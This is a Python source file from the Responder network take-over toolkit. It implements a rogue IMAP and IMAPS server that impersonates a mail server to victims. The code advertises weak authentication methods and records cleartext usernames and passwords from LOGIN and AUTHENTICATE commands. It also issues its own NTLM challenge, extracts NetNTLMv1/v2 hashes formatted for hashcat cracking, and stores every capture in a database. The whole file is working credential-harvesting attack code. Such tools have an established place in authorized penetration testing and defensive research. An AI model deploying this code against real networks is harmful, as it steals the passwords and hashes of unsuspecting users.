#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import base64
import re
import struct
import os
import ssl
from utils import *

if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

from packets import IMAPGreeting, IMAPCapability, IMAPCapabilityEnd

class IMAP(BaseRequestHandler):
	def __init__(self, *args, **kwargs):
		self.tls_enabled = False
		BaseRequestHandler.__init__(self, *args, **kwargs)
	
	def upgrade_to_tls(self):
		"""Upgrade connection to TLS using Responder's SSL certificates"""
		try:
			# Get SSL certificate paths from Responder config
			cert_path = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
			key_path = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
			
			if not os.path.exists(cert_path) or not os.path.exists(key_path):
				if settings.Config.Verbose:
					print(text('[IMAP] SSL certificates not found'))
				return False
			
			# Create SSL context
			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
			context.load_cert_chain(cert_path, key_path)
			
			# Wrap socket
			self.request = context.wrap_socket(self.request, server_side=True)
			self.tls_enabled = True
			
			if settings.Config.Verbose:
				print(text('[IMAP] Successfully upgraded to TLS from %s' % 
					self.client_address[0].replace("::ffff:", "")))
			
			return True
			
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[IMAP] TLS upgrade failed: %s' % str(e)))
			return False
	
	def send_capability(self, tag="*"):
		"""Send CAPABILITY response with STARTTLS if not already in TLS"""
		if self.tls_enabled:
			# After STARTTLS, don't advertise it again
			self.request.send(NetworkSendBufferPython2or3(IMAPCapability()))
		else:
			# Before STARTTLS, advertise it
			capability = "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN AUTH=LOGIN AUTH=NTLM STARTTLS\r\n"
			self.request.send(NetworkSendBufferPython2or3(capability))
		
		if tag != "*":
			self.request.send(NetworkSendBufferPython2or3(IMAPCapabilityEnd(Tag=tag)))
	
	def handle(self):
		try:
			# Send greeting
			self.request.send(NetworkSendBufferPython2or3(IMAPGreeting()))
			
			# Main loop to handle multiple commands
			while True:
				data = self.request.recv(1024)
				
				if not data:
					break
				
				# Handle CAPABILITY command
				if b'CAPABILITY' in data.upper():
					RequestTag = self.extract_tag(data)
					self.send_capability(RequestTag)
					continue
				
				# Handle STARTTLS command
				if b'STARTTLS' in data.upper():
					RequestTag = self.extract_tag(data)
					
					if self.tls_enabled:
						# Already in TLS
						response = "%s BAD STARTTLS already in TLS\r\n" % RequestTag
						self.request.send(NetworkSendBufferPython2or3(response))
						continue
					
					# Send OK response before upgrading
					response = "%s OK Begin TLS negotiation now\r\n" % RequestTag
					self.request.send(NetworkSendBufferPython2or3(response))
					
					# Upgrade to TLS
					if not self.upgrade_to_tls():
						# TLS upgrade failed, close connection
						break
					
					# Continue handling commands over TLS
					continue
				
				# Handle LOGIN command
				if b'LOGIN' in data.upper():
					success = self.handle_login(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE PLAIN
				if b'AUTHENTICATE PLAIN' in data.upper():
					success = self.handle_authenticate_plain(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE LOGIN
				if b'AUTHENTICATE LOGIN' in data.upper():
					success = self.handle_authenticate_login(data)
					if success:
						break
					continue
				
				# Handle AUTHENTICATE NTLM
				if b'AUTHENTICATE NTLM' in data.upper():
					success = self.handle_authenticate_ntlm(data)
					if success:
						break
					continue
				
				# Handle LOGOUT
				if b'LOGOUT' in data.upper():
					RequestTag = self.extract_tag(data)
					response = "* BYE IMAP4 server logging out\r\n"
					response += "%s OK LOGOUT completed\r\n" % RequestTag
					self.request.send(NetworkSendBufferPython2or3(response))
					break
				
				# Unknown command - send error
				RequestTag = self.extract_tag(data)
				response = "%s BAD Command not recognized\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[IMAP] Exception: %s' % str(e)))
			pass
	
	def extract_tag(self, data):
		"""Extract IMAP command tag (e.g., 'A001' from 'A001 LOGIN ...')"""
		try:
			parts = data.decode('latin-1', errors='ignore').split()
			if parts:
				return parts[0]
		except:
			pass
		return "A001"
	
	def handle_login(self, data):
		"""
		Handle LOGIN command
		Format: TAG LOGIN username password
		Credentials can be quoted or unquoted
		"""
		try:
			RequestTag = self.extract_tag(data)
			
			# Decode the data
			data_str = data.decode('latin-1', errors='ignore').strip()
			
			# Remove tag and LOGIN command
			# Pattern: TAG LOGIN credentials
			login_match = re.search(r'LOGIN\s+(.+)', data_str, re.IGNORECASE)
			if not login_match:
				response = "%s BAD LOGIN command syntax error\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			credentials_part = login_match.group(1).strip()
			
			# Parse credentials - can be quoted or unquoted
			username, password = self.parse_credentials(credentials_part)
			
			if username and password:
				# Save credentials
				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': username, 
					'cleartext': password, 
					'fullhash': username + ":" + password,
				})
				
				if settings.Config.Verbose:
					print(text('[IMAP] LOGIN captured: %s:%s from %s' % (
						username, password, self.client_address[0])))
				
				# Send success but then close
				response = "%s OK LOGIN completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				# Invalid credentials format
				response = "%s BAD LOGIN credentials format error\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def parse_credentials(self, creds_str):
		"""
		Parse username and password from LOGIN command
		Supports: "user" "pass", user pass, {5}user {8}password (literal strings)
		"""
		try:
			# Method 1: Quoted strings "user" "pass"
			quoted_match = re.findall(r'"([^"]*)"', creds_str)
			if len(quoted_match) >= 2:
				return quoted_match[0], quoted_match[1]
			
			# Method 2: Space-separated (unquoted)
			parts = creds_str.split()
			if len(parts) >= 2:
				# Remove any curly brace literals {5}
				user = re.sub(r'^\{\d+\}', '', parts[0])
				passwd = re.sub(r'^\{\d+\}', '', parts[1])
				return user, passwd
			
			return None, None
		
		except:
			return None, None
	
	def handle_authenticate_plain(self, data):
		"""Handle AUTHENTICATE PLAIN command - can be single-line or multi-line"""
		try:
			RequestTag = self.extract_tag(data)
			data_str = data.decode('latin-1', errors='ignore').strip()
			plain_match = re.search(r'AUTHENTICATE\s+PLAIN\s+(.+)', data_str, re.IGNORECASE)
			
			if plain_match:
				b64_creds = plain_match.group(1).strip()
			else:
				response = "+\r\n"
				self.request.send(NetworkSendBufferPython2or3(response))
				cred_data = self.request.recv(1024)
				if not cred_data:
					return False
				b64_creds = cred_data.decode('latin-1', errors='ignore').strip()
			
			try:
				decoded = base64.b64decode(b64_creds).decode('latin-1', errors='ignore')
				parts = decoded.split('\x00')
				
				if len(parts) >= 3:
					username = parts[1]
					password = parts[2]
				elif len(parts) >= 2:
					username = parts[0]
					password = parts[1]
				else:
					raise ValueError("Invalid PLAIN format")
				
				if username and password:
					SaveToDb({
						'module': 'IMAP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': username, 
						'cleartext': password, 
						'fullhash': username + ":" + password,
					})
					
					if settings.Config.Verbose:
						print(text('[IMAP] AUTHENTICATE PLAIN captured: %s:%s from %s' % (
							username, password, self.client_address[0])))
					
					response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
					self.request.send(NetworkSendBufferPython2or3(response))
					return True
			
			except Exception as e:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def handle_authenticate_login(self, data):
		"""Handle AUTHENTICATE LOGIN command - prompts for username, then password"""
		try:
			RequestTag = self.extract_tag(data)
			
			response = "+ " + base64.b64encode(b"Username:").decode('latin-1') + "\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			user_data = self.request.recv(1024)
			if not user_data:
				return False
			
			username_b64 = user_data.decode('latin-1', errors='ignore').strip()
			username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
			
			response = "+ " + base64.b64encode(b"Password:").decode('latin-1') + "\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			pass_data = self.request.recv(1024)
			if not pass_data:
				return False
			
			password_b64 = pass_data.decode('latin-1', errors='ignore').strip()
			password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')
			
			if username and password:
				SaveToDb({
					'module': 'IMAP', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': username, 
					'cleartext': password, 
					'fullhash': username + ":" + password,
				})
				
				if settings.Config.Verbose:
					print(text('[IMAP] AUTHENTICATE LOGIN captured: %s:%s from %s' % (
						username, password, self.client_address[0])))
				
				response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def handle_authenticate_ntlm(self, data):
		"""Handle AUTHENTICATE NTLM command - implements challenge-response"""
		try:
			RequestTag = self.extract_tag(data)
			
			response = "+\r\n"
			self.request.send(NetworkSendBufferPython2or3(response))
			
			type1_data = self.request.recv(2048)
			if not type1_data:
				return False
			
			type1_b64 = type1_data.decode('latin-1', errors='ignore').strip()
			
			try:
				type1_msg = base64.b64decode(type1_b64)
			except:
				return False
			
			type2_msg = self.generate_ntlm_type2()
			type2_b64 = base64.b64encode(type2_msg).decode('latin-1')
			
			response = "+ %s\r\n" % type2_b64
			self.request.send(NetworkSendBufferPython2or3(response))
			
			type3_data = self.request.recv(4096)
			if not type3_data:
				return False
			
			type3_b64 = type3_data.decode('latin-1', errors='ignore').strip()
			
			if type3_b64 == '*' or type3_b64 == '':
				if settings.Config.Verbose:
					print(text('[IMAP] Client cancelled NTLM authentication'))
				response = "%s NO AUTHENTICATE cancelled\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			if not all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\r\n' for c in type3_b64):
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			try:
				type3_msg = base64.b64decode(type3_b64)
			except Exception as e:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
			
			ntlm_hash = self.parse_ntlm_type3(type3_msg, type2_msg)
			
			if ntlm_hash:
				if settings.Config.Verbose:
					print(text('[IMAP] NTLM hash captured: %s from %s' % (
						ntlm_hash['user'], self.client_address[0])))
				
				SaveToDb(ntlm_hash)
				
				response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return True
			else:
				response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
				self.request.send(NetworkSendBufferPython2or3(response))
				return False
		
		except Exception as e:
			return False
	
	def generate_ntlm_type2(self):
		"""Generate NTLM Type 2 (Challenge) message with target info for NTLMv2"""
		import time
		
		challenge = os.urandom(8)
		self.ntlm_challenge = challenge
		
		target_name = b'W\x00O\x00R\x00K\x00G\x00R\x00O\x00U\x00P\x00'
		target_name_len = len(target_name)
		
		target_info = b''
		
		domain_name = b'W\x00O\x00R\x00K\x00G\x00R\x00O\x00U\x00P\x00'
		target_info += struct.pack('<HH', 0x0002, len(domain_name))
		target_info += domain_name
		
		computer_name = b'S\x00E\x00R\x00V\x00E\x00R\x00'
		target_info += struct.pack('<HH', 0x0001, len(computer_name))
		target_info += computer_name
		
		dns_domain = b'w\x00o\x00r\x00k\x00g\x00r\x00o\x00u\x00p\x00'
		target_info += struct.pack('<HH', 0x0004, len(dns_domain))
		target_info += dns_domain
		
		dns_computer = b's\x00e\x00r\x00v\x00e\x00r\x00'
		target_info += struct.pack('<HH', 0x0003, len(dns_computer))
		target_info += dns_computer
		
		timestamp = int((time.time() + 11644473600) * 10000000)
		target_info += struct.pack('<HH', 0x0007, 8)
		target_info += struct.pack('<Q', timestamp)
		
		target_info += struct.pack('<HH', 0x0000, 0)
		
		target_info_len = len(target_info)
		
		target_name_offset = 48
		target_info_offset = target_name_offset + target_name_len
		
		signature = b'NTLMSSP\x00'
		msg_type = struct.pack('<I', 2)
		
		target_name_fields = struct.pack('<HHI', target_name_len, target_name_len, target_name_offset)
		
		flags = b'\x05\x02\x81\xa2'
		
		context = b'\x00' * 8
		
		target_info_fields = struct.pack('<HHI', target_info_len, target_info_len, target_info_offset)
		
		type2_msg = (signature + msg_type + target_name_fields + flags + 
					 challenge + context + target_info_fields + target_name + target_info)
		
		return type2_msg
	
	def parse_ntlm_type3(self, type3_msg, type2_msg):
		"""Parse NTLM Type 3 (Authenticate) message and extract NetNTLMv2 hash"""
		try:
			from binascii import hexlify
			
			if type3_msg[:8] != b'NTLMSSP\x00':
				return None
			
			msg_type = struct.unpack('<I', type3_msg[8:12])[0]
			if msg_type != 3:
				return None
			
			lm_len, lm_maxlen, lm_offset = struct.unpack('<HHI', type3_msg[12:20])
			ntlm_len, ntlm_maxlen, ntlm_offset = struct.unpack('<HHI', type3_msg[20:28])
			domain_len, domain_maxlen, domain_offset = struct.unpack('<HHI', type3_msg[28:36])
			user_len, user_maxlen, user_offset = struct.unpack('<HHI', type3_msg[36:44])
			ws_len, ws_maxlen, ws_offset = struct.unpack('<HHI', type3_msg[44:52])
			
			if user_offset + user_len <= len(type3_msg):
				user = type3_msg[user_offset:user_offset+user_len].decode('utf-16le', errors='ignore')
			else:
				user = "unknown"
			
			if domain_offset + domain_len <= len(type3_msg):
				domain = type3_msg[domain_offset:domain_offset+domain_len].decode('utf-16le', errors='ignore')
			else:
				domain = ""
			
			if ntlm_offset + ntlm_len <= len(type3_msg):
				ntlm_response = type3_msg[ntlm_offset:ntlm_offset+ntlm_len]
			else:
				return None
			
			if len(ntlm_response) > 24:
				ntlmv2_response = ntlm_response[:16]
				ntlmv2_blob = ntlm_response[16:]
				
				challenge = type2_msg[24:32]
				
				hash_str = "%s::%s:%s:%s:%s" % (
					user,
					domain,
					hexlify(challenge).decode(),
					hexlify(ntlmv2_response).decode(),
					hexlify(ntlmv2_blob).decode()
				)
				
				if settings.Config.Verbose:
					print(text('[IMAP] NetNTLMv2 hash format (hashcat -m 5600)'))
				
				return {
					'module': 'IMAP',
					'type': 'NetNTLMv2',
					'client': self.client_address[0],
					'user': user,
					'domain': domain,
					'hash': hash_str,
					'fullhash': hash_str
				}
			else:
				ntlm_hash = ntlm_response[:24]
				challenge = type2_msg[24:32]
				
				if lm_offset + lm_len <= len(type3_msg) and lm_len == 24:
					lm_hash = type3_msg[lm_offset:lm_offset+lm_len]
				else:
					lm_hash = b'\x00' * 24
				
				hash_str = "%s::%s:%s:%s:%s" % (
					user,
					domain,
					hexlify(lm_hash).decode(),
					hexlify(ntlm_hash).decode(),
					hexlify(challenge).decode()
				)
				
				if settings.Config.Verbose:
					print(text('[IMAP] NetNTLMv1 hash format (hashcat -m 5500)'))
				
				return {
					'module': 'IMAP',
					'type': 'NetNTLMv1',
					'client': self.client_address[0],
					'user': user,
					'domain': domain,
					'hash': hash_str,
					'fullhash': hash_str
				}
		
		except Exception as e:
			return None

class IMAPS(IMAP):
	"""IMAP over SSL (port 993) - SSL wrapper that inherits from IMAP"""
	
	def setup(self):
		"""Setup SSL socket before handling - called automatically by SocketServer"""
		try:
			# Get SSL certificate paths from Responder config
			cert_path = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
			key_path = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)
			
			if not os.path.exists(cert_path) or not os.path.exists(key_path):
				if settings.Config.Verbose:
					print(text('[IMAPS] SSL certificates not found'))
				self.request.close()
				return
			
			# Create SSL context
			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
			context.load_cert_chain(cert_path, key_path)
			
			# Wrap socket in SSL before IMAP handles it
			self.request = context.wrap_socket(self.request, server_side=True)
			
			# Mark as already in TLS so STARTTLS isn't advertised
			self.tls_enabled = True
			
			if settings.Config.Verbose:
				print(text('[IMAPS] SSL connection from %s' % 
					self.client_address[0].replace("::ffff:", "")))
			
		except ssl.SSLError as e:
			# Client rejected self-signed cert - suppress expected errors
			if 'ALERT_BAD_CERTIFICATE' not in str(e) and settings.Config.Verbose:
				print(text('[IMAPS] SSL handshake failed: %s' % str(e)))
			try:
				self.request.close()
			except:
				pass
		except Exception as e:
			if 'Bad file descriptor' not in str(e) and settings.Config.Verbose:
				print(text('[IMAPS] SSL setup error: %s' % str(e)))
			try:
				self.request.close()
			except:
				pass
	
	# handle() method is inherited from IMAP class - no need to override!
